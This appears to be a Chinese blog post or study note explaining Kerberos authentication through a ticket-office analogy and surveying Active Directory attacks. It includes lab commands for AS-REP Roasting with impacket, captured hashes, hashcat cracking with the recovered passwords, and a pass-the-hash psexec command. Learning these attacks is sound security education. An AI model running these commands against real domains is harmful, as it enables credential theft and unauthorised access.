---
tags:
  - 渗透
title: 浅谈Kerberos协议及一些攻击方法
data: 2024-11-21
---

# 专业词汇前瞻

kerberos协议中也存在三个角色， Client   Server  KDC

```
Client:访问服务的客户机
Server:提供服务的服务器

KDC(Key Distribution Center):密钥分发中心 
KDC中分成两个部分:Authentication Service和Ticket Granting Service
(1)Authentication Service(AS):身份验证服务器
AS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client
(2)Ticket Granting Service(TGS):票据授予服务器
TGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client.

凭据
(1)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.
(2)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.
(3)SEerver Ticket(ST):ST服务票据，由TGS服务发布.

Active Directory(AD):活动目录，充当集中存储库并存储与Active Directory 用户、计算机、服务器和组织内的其他资源等对象相关的所有数据

Domain Controller(DC):域控制器
```



![image-20241121000559500](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121000559500.png)



# 现实场景类比

这样的话其实有一个问题就是，无发现验证买票者是否合法，凭什么卖票给它。

![image-20241121002134458](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002134458.png)

把安检和卖票这两个功能分开即可。

![image-20241121002151680](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002151680.png)

## 1.身份检查

![image-20241121003034910](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003034910.png)

## 2.买票

![image-20241121003134967](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003134967.png)

## 3.入园

![image-20241121003159449](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003159449.png)

## 现实场景

![image-20241121003409168](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003409168.png)



# 过程细节

## AS_REQ&AS_REP

依然是clinet拿信息（Name、IP、Time等） 去AS进行认证，认证成功则获取 TGT返回给clinet。

第一，KDC是存有用户hash的。

第二，TGT由两部分构成，一部分用hash加密，一部分用krbtgt的hash加密。

第三，注意上半部分的CT_SK

![image-20241121004244873](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121004244873.png)

## TGS_REQ

TGS然后用户对TGT进行一些处理。底部加上我们要访问的目标servername（想要参观的动物），上半部分内容重新用CT_SK加密。

![image-20241121005119609](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005119609.png)

## TGS_REP

1. TSG对用户发回来的TGT下半部分进行解密
2. 然后用里面的CS_SK对上半部分进行解密
3. 检测用户信息是都一致，是否遭到恶意篡改
4. 将ST返回给用户

![image-20241121005555888](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005555888.png)

## AP_REQ&AP_REP

最后一步拿着ST去参观即可。

用户始终无法读取下半部分的内容，一但发现与上半部分不一样，定是上半部分的内容遭遇了篡改伪造。

![image-20241121010329215](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121010329215.png)

其实例子比较抽象，为了更加方便大家理解同时也丧失了一定的严谨性，其实最主要的还是尝试接受这些知识，然后对这个流程有一个大致的了解即可。

# 攻击

其实这些攻击说需要的信息怎么收集，这些攻击怎么实现，用什么工具。这里不深入探讨，主要还比靠大家在实践中积累。

## AS_REQ

其实好多攻击都生在这个阶段。

### 域内用户枚举

### 密码喷洒

### AS-REP Roasting

在as-req阶段，请求包cname对应的值是用户名，当用户状态不同时，比如用户存在且启用、用户存在但禁用、用户不存在，不同的状态返回包的提示都是不同的，因此可以进行枚举。

案例

```shell
impacket-GetNPUsers -dc-ip 172.22.15.13  xiaorang.lab/ -usersfile user.txt  # 枚举域内用户
$krb5asrep$23$lixiuying@XIAORANG.LAB:9bccb028399d418e7868c57be60afcaf$8ea13235b6f1c2c7b6a7a20d4dc635e1e24805b2bcb9c391b8574977ac751a4ccb3cc4efd1ed47126ee95f1ed0879c103e60fc4dca57e269ba37bfe796a6286ca391061b666010ca69f4ac45b664cab6a7a17b7da508e7bfb0e04c69fa63a4481379ae03abea511486a189b80c1502a9acf310033ba1c901137eb8152431c5ac413d271a269ab6a719207403657e85a98c11375f81801e43517bb0d619d939c9f8f706c6689adb653d3925acae94864d746e30ec9d581a2d2243e9453044b59d8ec7ab349c23193d90b0dbbe3eac1a1215a1e24fa26d1289a34003b44b95976a9b2f4aa1ea49cda5cdcd8e41
$krb5asrep$23$huachunmei@XIAORANG.LAB:879b2674cec6a159d3a5f96202160634$c88520dd6e951b91e04929aa636d965d0931f035a5a46245c8dd1a02ceeaa633dbd96718dfb1622f7ae6a40bafe2e51f43131b05082f3853dbb1b15aa302affac5e952d298ac0174e5ae6bcb5c00cd0f7dbddcb2bb6ce8730c134daf6251fbe5338b6d2a31580051b60dd71e1b8d5cf80546c4a7c44a79a24511bc7f77a09a3aebe05330f4b23e150f09884ae525fff367c956990c70545a45e3f987812eafb2e95b8769618dc1d8b8db20a4c1b374348d36a6093735673214b711025bd6fa1fe5b1ed97caf45e49b7fa17c606afca249b2180a55809ae4a57f1fcdabc8b96381c0ad6b580ef8218a2e2aa0c

hashcat -a 0 -m 18200 --force '……' rockyou.txt # 利用hashcat 进行爆破
lixiuying@xiaorang.lab:winniethepooh
huachunmei@xiaorang.lab:1qaz2wsx
```

### PTH(pass-the-hash)哈希传递

这个阶段我们使用的是用户hash解密可以通过hash伪造用户身份发起请求，这也是哈希传递攻击出现的根本原因

案例

```
impacket-psexec administrator@172.22.15.24 -hashes ':0e52d03e9b939997401466a0ec5a9cbc' -codec gbk
```

# 黄金票据

大概在AS_REQ的时候，我们注意这个TGT，我们一旦知道了krbtgt的hash。其它的一切，都是可以伪造的。伪造的CT_SK只要和上面加密使用的CT_SK保持一致就行。 

而实际场景中我们需要知道这些信息。我们可以伪造任何已经存在并且知道其用户名 的用户。

```
1.域名称
2.域的SID值
3.域的KRBTGT账户NTLM密码哈希
4.伪造用户名
```

![image-20241121101838006](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121101838006.png)

# 白银票据

这个伪造大概 发生在 AP_REQ ，这里伪造的是 ST。 

可以看出来只可以访问指定server。不如黄金票据可以访问任意server。

![image-20241121103017103](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121103017103.png)

实际情况下需要如下信息。

```
1.域名
2.域sid
3.目标服务FQDN
4.服务名
5.服务账号的NTML HASH
6.伪造的用户名
```

# 委派攻击

想象一个场景，弟弟需要借钱，经过张妈同意后成功向张三借到钱。但是有一天。弟弟需要借一个笔，但是张三没有笔，但是他的一个艺术生同学有，张三先向他同学借，然后把这个笔给了弟弟。

总的来说，就是

用户A(hostA)、服务B(hostB)、服务C(hostC)，这时用户A想要使用hostB上的服务B，这个功能需要让主机hostB上的服务B访问主机HostC上的服务C中专属于用户A的部分才能完成，因此需要主机hostB上的服务B就需要代表用户A去访问hostC上的服务C，这个过程就被称为委派。

![image-20241121104347394](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121104347394.png)

![image-20241121105307086](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121105307086.png)

这个说实话稍微复杂一些，可以单开一篇文章讲一讲了。

大概可以分为

## 非约束性委派

## 约束性委派

## 基于资源的非约束性委派(RBDC)

这里挖个坑，一个是这个委派，到时候还会详解， 一个是这个Kerberos 到时候还会结合wireshark 流量分析进行详解。

但是其实我感觉原理并不是最难的，而是那些眼花缭乱的工具。还有工具的使用。感觉这些原理不懂有时候也不影响大家对于工具的使用。但是懂一些原理肯定帮你多一个纬度去记忆和理解那些操作。



https://www.bilibili.com/video/BV1DH4y1F7mf

https://fushuling.com/index.php/2023/09/02/windows%e5%9f%9f%e6%b8%97%e9%80%8f%e4%b9%8bkerberos%e5%8d%8f%e8%ae%ae/
